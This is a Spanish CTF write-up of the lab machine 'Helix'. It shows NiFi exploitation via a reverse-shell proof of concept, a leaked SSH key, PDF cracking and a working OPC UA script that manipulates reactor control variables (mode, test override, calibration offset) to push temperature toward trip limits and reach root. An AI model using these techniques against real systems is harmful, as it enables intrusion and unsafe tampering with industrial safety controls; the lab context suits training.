
# Helix

<figure><img src="/files/fhhipQcGFJgTNp00VxvX" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Helix`
* **IP:** `10.129.66.66`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `14-05-2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.66.66 helix.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.66.66PORT   STATE SERVICE VERSION
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://helix.htb` y observamos que parece ser una plataforma de para gestionar infraestructura crítica.

<figure><img src="/files/pyLryGVFYMTpVR4XEUse" alt=""><figcaption></figcaption></figure>

La web solo tiene 2 funcionalidades: `Start a Project` y `Request a call`, con formularios que podrían ser vulnerables a alguna inyección:

<figure><img src="/files/rw1nVj2kPFSxXEwVWOho" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/1Gj2KkKT2GWzPNKOD1z7" alt=""><figcaption></figcaption></figure>

### BurpSuite

Capturando un request de los formularios observamos que hace la petición a través de la API `nifi-api`, y en el referer encontramos un subdominio `flow.helix.htb`, que añadiremos a nuestro `/etc/hosts`.

<figure><img src="/files/uoIf7t1mk2OzLqTRDK2d" alt=""><figcaption></figcaption></figure>

### Acceso al Subdominio

Al acceder a `flow.helix.htb` nos redirige al directorio `/nifi`

<figure><img src="/files/6iD0bmYH9huekOo3X7eV" alt=""><figcaption></figcaption></figure>

Apache NiFi (NiFi Flow) es una herramienta de código abierto diseñada para automatizar y gestionar el flujo de datos en tiempo real entre diferentes sistemas. Funciona bajo el paradigma de programación basada en grafos, permitiendo ingestar, transformar, enrutar y entregar datos de manera visual, segura y escalable sin necesidad de escribir código.

Al capturar con BurpSuite un request de `flow.helix.htb/nifi` observamos que hace una autenticación kerberos, lo que podría involucrar un Active Directory:

<figure><img src="/files/X8BFaASMmvSFGvUzBqGa" alt=""><figcaption></figcaption></figure>

Y observamos multitud de endpoints de la API:

<figure><img src="/files/En3rVQpz2qXZSgTRhsOa" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Hallazgos relevantes

#### Testing API

Encontramos multitud de endpoint de API en el subdominio:

{% code overflow="wrap" %}

```bash
200	/api/keys	http://flow.helix.htb/api/keys	text/html
200	/api/tokens	http://flow.helix.htb/api/tokens	text/html
200	/api/secrets	http://flow.helix.htb/api/secrets	text/html
200	/api/credentials	http://flow.helix.htb/api/credentials	text/html
200	/api/backup	http://flow.helix.htb/api/backup	text/html
200	/api/dump	http://flow.helix.htb/api/dump	text/html
200	/api/v1/users	http://flow.helix.htb/api/v1/users	text/html
200	/api/v1/user	http://flow.helix.htb/api/v1/user	text/html
200	/api/v1/internal	http://flow.helix.htb/api/v1/internal	text/html
200	/api/v1/private	http://flow.helix.htb/api/v1/private	text/html
200	/api/v1/hidden	http://flow.helix.htb/api/v1/hidden	text/html
200	/api/v1/keys	http://flow.helix.htb/api/v1/keys	text/html
200	/api/v1/secrets	http://flow.helix.htb/api/v1/secrets	text/html
200	/api/v1/credentials	http://flow.helix.htb/api/v1/credentials	text/html
200	/api/v1/api-keys	http://flow.helix.htb/api/v1/api-keys	text/html
200	/api/v2/users	http://flow.helix.htb/api/v2/users	text/html
200	/api/v2/user	http://flow.helix.htb/api/v2/user	text/html
200	/api/v2/accounts	http://flow.helix.htb/api/v2/accounts	text/html
200	/api/v2/account	http://flow.helix.htb/api/v2/account	text/html
200	/api/v2/token	http://flow.helix.htb/api/v2/token	text/html
200	/api/v2/tokens	http://flow.helix.htb/api/v2/tokens	text/html
200	/api/v2/refresh	http://flow.helix.htb/api/v2/refresh	text/html
200	/api/v2/session	http://flow.helix.htb/api/v2/session	text/html
200	/api/v2/sessions	http://flow.helix.htb/api/v2/sessions	text/html
200	/api/v2/password	http://flow.helix.htb/api/v2/password	text/html
...
```

{% endcode %}

#### Nuclei

Encontramos vulnerabilidades Critical y High de RCE u Unauthenticated Access:

<table><thead><tr><th width="119.333251953125">Severidad</th><th width="174.9259033203125">Template</th><th width="223.29638671875">Nombre</th><th>URL</th></tr></thead><tbody><tr><td>CRITICAL</td><td><code>apache-nifi-rce</code></td><td>Apache NiFi - Remote Code Execution</td><td>http://flow.helix.htb/nifi-api/process-groups/root</td></tr><tr><td>HIGH</td><td><code>apache-nifi-unauth</code></td><td>Apache NiFi - Unauthenticated Access</td><td>http://flow.helix.htb/nifi-api/access/config</td></tr><tr><td>MEDIUM</td><td><code>CVE-2024-56512</code></td><td>Apache NiFi - Information Disclosure</td><td>http://flow.helix.htb/nifi-api/controller/config</td></tr><tr><td>MEDIUM</td><td><code>CVE-2024-56512</code></td><td>Apache NiFi - Information Disclosure</td><td>http://flow.helix.htb/nifi-api/flow/process-groups/root</td></tr></tbody></table>

***

## <mark style="color:$primary;">Explotación</mark>

### Exploit para RCE

Encontramos un exploit para Explotar Nifi Flow:

{% embed url="<https://github.com/Al3xx-sec/CVE-2023-34468-POC>" %}

{% code overflow="wrap" %}

```bash
git clone https://github.com/Al3xx-sec/CVE-2023-34468-POC.git
cd CVE-2023-34468-POC

```

{% endcode %}

{% code overflow="wrap" %}

```bash
python3 CVE-2023-34468_poc.py --target http://flow.helix.htb \
                              --lhost 10.10.14.41 \
                              --lport 4444 \
                              --http-port 80 \
                              --cleanup
```

{% endcode %}

<figure><img src="/files/Wd5Rx1YD5ovpFHKORx3v" alt=""><figcaption></figcaption></figure>

Tenemos una shell como el usuario `nifi`, pero no podemos acceder al directorio de la user flag, que pertenece al usuario `operator`:

{% code overflow="wrap" %}

```bash
nifi@helix:/opt/nifi-1.21.0$ cd /home
nifi@helix:/home$ ls
operator
nifi@helix:/home$ cd operator
bash: cd: operator: Permission denied
```

{% endcode %}

### Credential Hunting

Encontramos un archivo .bak que pertenece a operator, y con el que vemos su ID:

{% code overflow="wrap" %}

```bash
nifi@helix:/home$ find / -name "*.bak" 2>/dev/null
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

{% endcode %}

Concretamente es una clave privada SSH!

{% code overflow="wrap" %}

```bash
nifi@helix:/home$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

{% endcode %}

***

## <mark style="color:$primary;">Acceso Inicial</mark>

Guardamos la clave a un archivo key:

{% code overflow="wrap" %}

```bash
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----' > key
```

{% endcode %}

Le damos los permisos correctos:

{% code overflow="wrap" %}

```bash
chmod 600 key
```

{% endcode %}

Y accedemos por SSH sin contraseña usando la clave privada:

{% code overflow="wrap" %}

```bash
ssh -i key operator@helix.htb

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)

Last login: Wed May 13 21:00:45 2026 from 10.10.14.41

operator@helix:~$ whoami
operator
```

{% endcode %}

***

## <mark style="color:$primary;">User Flag</mark>

```bash
operator@helix:~$ ls
'control systems diagram.png'           user.txt
'Operator Control & Safety Guide.pdf'

operator@helix:~$ cat user.txt 
137a392c17b5b6860c1e4e2c********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

Podemos ejecutar como root `helix-maint-console`:

```bash
operator@helix:~$ sudo -l                                                                                                                   
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

### Ver código del script

```bash
operator@helix:~$ cat /usr/local/sbin/helix-maint-console

#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```

Que hace.

### Enumeración interna

En la home de operator encontramos un pdf interesante y una imagen:

{% code overflow="wrap" %}

```bash
operator@helix:~$ ls
'control systems diagram.png'  'Operator Control & Safety Guide.pdf'   user.txt
```

{% endcode %}

Nos descargamos los archivos a Kali:

En la máquina:

{% code overflow="wrap" %}

```bash
operator@helix:~$ python3 -m http.server 4455
```

{% endcode %}

En Kali:

{% code overflow="wrap" %}

```bash
wget http://10.129.66.66:4455/'Operator Control & Safety Guide.pdf'
wget http://10.129.66.66:4455/'control systems diagram.png'
```

{% endcode %}

El PDF está protegido por contraseña:

<figure><img src="/files/DNwYEQ5sr39rAm3z9NB6" alt=""><figcaption></figcaption></figure>

### Pdf2john

{% code overflow="wrap" %}

```bash
pdf2john 'Operator Control & Safety Guide.pdf' > hash 
```

{% endcode %}

{% code overflow="wrap" %}

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (Operator Control & Safety Guide.pdf) 
```

{% endcode %}

Bingo! Tenemos la contraseña.

<figure><img src="/files/aU3VgDW35DiYIwtRQ0KZ" alt=""><figcaption></figcaption></figure>

El PDF escribe un sistema de control de reactor con variables como `Temperature`, `Pressure`, `CalibrationOffset`, `Mode`, `TestOverride`, `ResetTrip`.&#x20;

La ventana de mantenimiento se abre cuando **Temperature ≈ 295°C o Pressure ≈ 73 bar** (por debajo de los límites de disparo: 305°C y 75 bar). Para entrar en modo mantenimiento, se debe cambiar `Mode` a `MAINTENANCE`, habilitar `TestOverride` y ajustar `CalibrationOffset`.&#x20;

El script `helix-maint-console` requiere que exista `/opt/helix/state/maintenance_window` con timestamp futuro. Muy probablemente, el PLC (proceso `helix-plc` como usuario `plc`) crea ese archivo cuando se alcanzan las condiciones de la ventana de mantenimiento.

La imagen PNG que nos descargamos también tiene información relevante:

<figure><img src="/files/lwbBaP2wGoAS3VEHjW9X" alt=""><figcaption></figcaption></figure>

El diagrama ilustra cómo un servidor OPC UA centraliza la comunicación entre sistemas de reactor, control y seguridad, permitiendo supervisión y control (local o remoto), mientras mantiene restricciones en los elementos críticos de seguridad.

### Manipulación de OPC UA

Para activar la ventana de mantenimiento, debemos controlar el estado del PLC utilizando el endpoint OPC UA local: `opc.tcp://127.0.0.1:4840/helix/`.

No podemos crear scripts custom para explotar OPC UA por falta de dependencias:

{% code overflow="wrap" %}

```bash
operator@helix:/tmp$ python3 exploit.py 
Traceback (most recent call last):
  File "/tmp/exploit.py", line 10, in <module>
    from opcua import Client
ModuleNotFoundError: No module named 'opcua'
```

{% endcode %}

#### SSH Tunnelling

{% code overflow="wrap" %}

```bash
ssh -i key -L 4840:localhost:4840 operator@helix.htb -N
```

{% endcode %}

#### Scripting

Utilizaremos el siguiente script que he creado para obtener información de los nodos del OPC:

{% code overflow="wrap" %}

```python
#!/usr/bin/env python3
from opcua import Client

url = "opc.tcp://localhost:4840/helix/"
client = Client(url)
client.connect()
print("[+] Conectado")

root = client.get_root_node()
objects = client.get_objects_node()

keywords = ["temperature", "pressure", "mode", "offset", "override", "trip", "reset", "calibration"]
found = set()

def search(node, depth=0):
    if depth > 5:
        return
    name = node.get_browse_name().Name.lower()
    for kw in keywords:
        if kw in name:
            full_name = node.get_browse_name().Name
            try:
                value = node.get_value()
                print(f"*** {full_name} = {value}")
            except:
                print(f"*** {full_name} (no readable)")
            found.add(full_name)
            break
    for child in node.get_children():
        search(child, depth+1)

print("[*] Buscando nodos con palabras clave...")
search(objects)

print("\n[*] Nodos encontrados:")
for f in sorted(found):
    print(f"  {f}")

client.disconnect()
```

{% endcode %}

Y lo ejecutamos:

{% code overflow="wrap" %}

```bash
python3 opc_recon.py

[+] Conectado
[+] Nodo Plant encontrado

[*] Explorando Plant (profundidad máxima 3):
Plant (no readable)
  Reactor (no readable)
    TemperatureRaw = 283.9999960486055
    Temperature = 283.9999960486055
    Pressure = 68.99999653343924
    CalibrationOffset = 0.0
  Safety (no readable)
    RodsInserted = False
    EmergencyCooling = False
    TripActive = False
  Control (no readable)
    Mode = NORMAL
    TestOverride = False
    ResetTrip = False

[*] Intentando acceder a 'Reactor', 'Safety', 'Control' bajo Plant:
Error accediendo a Reactor: "The requested operation has no match to return."(BadNoMatch)
Error accediendo a Safety: "The requested operation has no match to return."(BadNoMatch)
Error accediendo a Control: "The requested operation has no match to return."(BadNoMatch)
```

{% endcode %}

Ahora tenemos los nombres exactos de los nodos.&#x20;

#### Enumerar objetos raiz

{% code overflow="wrap" %}

```python
from opcua import Client

url = "opc.tcp://localhost:4840/helix/"
client = Client(url)
client.connect()
print("Conectado")

objects = client.get_objects_node()
print("Objetos raíz:")
for obj in objects.get_children():
    print(obj.get_browse_name().Name)
    if obj.get_browse_name().Name == "Plant":
        plant = obj
        print("\n--- Plant encontrado ---")
        for child in plant.get_children():
            print(child.get_browse_name().Name)
        break
else:
    print("No se encontró Plant")

client.disconnect()
```

{% endcode %}

{% code overflow="wrap" %}

```bash
python3 opc_recon2.py
Conectado
Objetos raíz:
Locations
Server
Aliases
Plant

--- Plant encontrado ---
Reactor
Safety
Control
```

{% endcode %}

### Exploit final

Podemos manipular las variables del reactor para alcanzar la ventana de mantenimiento.&#x20;

Desde tu Kali (con el túnel SSH activo), ejecuta el siguiente script:

{% code overflow="wrap" %}

```python
#!/usr/bin/env python3

import time
import sys
import subprocess
from opcua import Client, ua

URL = "opc.tcp://localhost:4840/helix/"
TARGET_TEMP = 295.0
TARGET_PRESS = 73.0
STEP = 0.3      # Paso más pequeño para evitar inestabilidad
SLEEP = 3       # Más tiempo entre cambios
TIMEOUT = 10    # Timeout de lectura (segundos)

def safe_get_value(node, retries=3):
    for attempt in range(retries):
        try:
            return node.get_value()
        except Exception as e:
            print(f"  [Reintento {attempt+1}] Error leyendo {node.get_browse_name().Name}: {e}")
            time.sleep(2)
    raise Exception(f"No se pudo leer {node.get_browse_name().Name} después de {retries} intentos")

def safe_set_value(node, value, retries=2):
    for attempt in range(retries):
        try:
            node.set_value(value)
            return
        except Exception as e:
            print(f"  [Reintento {attempt+1}] Error escribiendo {node.get_browse_name().Name}: {e}")
            time.sleep(2)
    raise Exception(f"No se pudo escribir {node.get_browse_name().Name}")

def main():
    client = Client(URL)
    client.timeout = TIMEOUT
    try:
        client.connect()
        print("[+] Conectado a OPC UA")
    except Exception as e:
        print(f"[-] Error de conexión: {e}")
        sys.exit(1)

    # Obtener nodo Plant (mismo método que funcionó)
    objects = client.get_objects_node()
    plant = None
    for child in objects.get_children():
        if child.get_browse_name().Name == "Plant":
            plant = child
            break
    if plant is None:
        print("[-] No se encontró Plant")
        sys.exit(1)

    # Obtener Reactor, Safety, Control
    reactor = safety = control = None
    for child in plant.get_children():
        name = child.get_browse_name().Name
        if name == "Reactor":
            reactor = child
        elif name == "Safety":
            safety = child
        elif name == "Control":
            control = child

    if not (reactor and safety and control):
        print("[-] Faltan submódulos")
        sys.exit(1)

    # Obtener variables
    temp_node = press_node = offset_node = None
    for child in reactor.get_children():
        name = child.get_browse_name().Name
        if name == "Temperature":
            temp_node = child
        elif name == "Pressure":
            press_node = child
        elif name == "CalibrationOffset":
            offset_node = child

    trip_node = None
    for child in safety.get_children():
        if child.get_browse_name().Name == "TripActive":
            trip_node = child
            break

    mode_node = test_node = reset_node = None
    for child in control.get_children():
        name = child.get_browse_name().Name
        if name == "Mode":
            mode_node = child
        elif name == "TestOverride":
            test_node = child
        elif name == "ResetTrip":
            reset_node = child

    if not all([temp_node, press_node, offset_node, trip_node, mode_node, test_node, reset_node]):
        print("[-] Faltan variables")
        sys.exit(1)

    print("[*] Variables iniciales:")
    print(f"    Temperatura: {safe_get_value(temp_node)}°C")
    print(f"    Presión: {safe_get_value(press_node)} bar")
    print(f"    Offset: {safe_get_value(offset_node)}")
    print(f"    Trip: {safe_get_value(trip_node)}")

    # Resetear trip si está activo
    if safe_get_value(trip_node):
        print("[!] Trip activo. Reseteando...")
        safe_set_value(reset_node, True)
        time.sleep(1)
        safe_set_value(reset_node, False)
        time.sleep(3)
        if safe_get_value(trip_node):
            print("[-] No se pudo resetear el trip")
            sys.exit(1)

    # Activar modo mantenimiento
    print("[*] Activando modo mantenimiento...")
    safe_set_value(mode_node, "MAINTENANCE")
    safe_set_value(test_node, True)

    # Incrementar offset gradualmente
    offset = safe_get_value(offset_node)
    iteration = 1
    window_reached = False

    while not window_reached:
        new_offset = offset + iteration * STEP
        print(f"\n[*] Iteración {iteration}: offset = {new_offset:.2f}")
        safe_set_value(offset_node, new_offset)
        time.sleep(SLEEP)

        temp = safe_get_value(temp_node)
        press = safe_get_value(press_node)
        trip = safe_get_value(trip_node)
        print(f"    Temperatura = {temp:.2f}°C | Presión = {press:.2f} bar | Trip = {trip}")

        if trip:
            print("[-] Trip activado. Abortando.")
            break
        if temp >= TARGET_TEMP or press >= TARGET_PRESS:
            print(f"[+] ¡Ventana alcanzada! Temp={temp:.2f}°C, Pres={press:.2f} bar")
            window_reached = True
            break
        iteration += 1
        if iteration > 60:
            print("[-] Límite de iteraciones alcanzado.")
            break

    if not window_reached:
        print("[-] No se alcanzó la ventana. Restaurando valores...")
        safe_set_value(mode_node, "NORMAL")
        safe_set_value(test_node, False)
        safe_set_value(offset_node, 0.0)
        client.disconnect()
        sys.exit(1)

    # Esperar a que el sistema cree el archivo (con comprobación real vía SSH)
    print("\n[*] Esperando la creación del archivo /opt/helix/state/maintenance_window...")
    for _ in range(30):
        # Verificar mediante SSH (clave en ~/.ssh o usar la misma clave)
        result = subprocess.run(
            ["ssh", "-i", "key", "-o", "StrictHostKeyChecking=no", "operator@helix.htb",
             "test -f /opt/helix/state/maintenance_window && echo 'exists' || echo 'no'"],
            capture_output=True, text=True
        )
        if "exists" in result.stdout:
            print("[+] Archivo de mantenimiento detectado.")
            break
        time.sleep(1)
    else:
        print("[!] No se detectó el archivo, pero se intentará igualmente.")

    # Restaurar valores
    print("[*] Restaurando configuración normal...")
    safe_set_value(mode_node, "NORMAL")
    safe_set_value(test_node, False)
    safe_set_value(offset_node, 0.0)

    client.disconnect()

    print("\n[+] ¡Exploit completado! Ahora ejecuta en la sesión SSH:")
    print("    sudo /usr/local/sbin/helix-maint-console")
    print("    Obtendrás una shell root.")

if __name__ == "__main__":
    main()
```

{% endcode %}

Al ejecutarlo conseguimos que vaya aumentando la tenmperatura y la presión del reactor hasta que alcance la ventana de mantenimiento:

{% code overflow="wrap" %}

```bash
python3 exploit_helix.py

[+] Conectado a OPC UA
[*] Variables iniciales:
    Temperatura: 283.93588066854375°C
    Presión: 68.99222615683942 bar
    Offset: 0.0
    Trip: False
[*] Activando modo mantenimiento...

[*] Iteración 1: offset = 0.30
    Temperatura = 284.33°C | Presión = 69.04 bar | Trip = False

[*] Iteración 2: offset = 0.60
    Temperatura = 284.71°C | Presión = 69.08 bar | Trip = False

[*] Iteración 3: offset = 0.90
    Temperatura = 285.08°C | Presión = 69.11 bar | Trip = False

[*] Iteración 4: offset = 1.20
    Temperatura = 285.44°C | Presión = 69.14 bar | Trip = False

[*] Iteración 5: offset = 1.50
    Temperatura = 285.81°C | Presión = 69.18 bar | Trip = False

[*] Iteración 6: offset = 1.80
    Temperatura = 286.15°C | Presión = 69.20 bar | Trip = False

[*] Iteración 7: offset = 2.10
    Temperatura = 286.49°C | Presión = 69.22 bar | Trip = False
    
<---SNIP--->

[*] Iteración 36: offset = 10.80
    Temperatura = 295.19°C | Presión = 69.28 bar | Trip = False
[+] ¡Ventana alcanzada! Temp=295.19°C, Pres=69.28 bar

[*] Esperando la creación del archivo /opt/helix/state/maintenance_window...
```

{% endcode %}

Una vez que hemos alcanzado la ventana de temperatura y presión, en una nueva terminal accedemos por SSH y ejecutamos lo siguiente:

{% code overflow="wrap" %}

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console

[+] Privileged maintenance access granted
[!] Window expires in 51 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# whoami
root
```

{% endcode %}

Somos root!

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
root@helix:/home/operator# cd /root
root@helix:~# ls
root.txt  snap
root@helix:~# cat root.txt 
f40db445af31fa92c2457cb0********
```
